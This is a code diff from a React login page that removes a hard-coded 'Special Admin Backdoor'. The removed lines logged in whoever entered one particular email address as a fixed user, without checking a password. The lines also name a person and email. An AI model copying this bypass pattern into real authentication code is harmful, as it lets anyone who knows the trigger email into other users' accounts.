@@ -112,18 +112,6 @@ const AuthPage: React.FC<AuthPageProps> = ({ onLogin }) => {
           // --- LOGIN FLOW ---
           // Check credentials against LocalStorage
           
-          // Special Admin Backdoor
-          if (email.trim().toLowerCase() === 'wendy.toussaint@icloud.com') {
-               const adminUser: User = {
-                  name: "Wendy Toussaint",
-                  email: email.trim().toLowerCase(),
-                  type: UserType.PME,
-                  phone: "0000000000"
-               };
-               onLogin(adminUser);
-               return;
-          }
-
           const users = getUsersFromStorage();
           const foundUser = users.find(u => u.email === email.trim().toLowerCase());
 
